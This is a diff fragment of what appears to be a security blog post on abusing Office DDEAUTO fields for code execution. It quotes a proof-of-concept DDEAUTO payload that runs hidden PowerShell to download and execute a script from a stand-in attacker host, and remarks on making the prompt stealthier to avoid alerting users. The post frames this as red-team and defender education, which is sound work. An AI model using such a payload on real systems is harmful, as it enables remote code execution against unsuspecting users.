@@ -16,7 +16,7 @@ Saif does a good job of explaining the steps in his post, but the basic setup is
 The possibilities here are endless. Saif's proof of concept video in the post uses powershell to download an empire launcher
    <p> <code> { DDEAUTO c:\\Windows\\System32\\cmd.exe "/k powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://evilserver.ninja/pp.ps1');powershell -e $e "}
 </code>
- 
+ <p>
 I think depending on the access I had on the machine, I would change the syntax to be more stealthy, so the popup doesnt raise any red-flags with the user. 
 
 Execution is lots of fun, but improving defenders and showing them how to find the cool techniques is really where the money is made. 
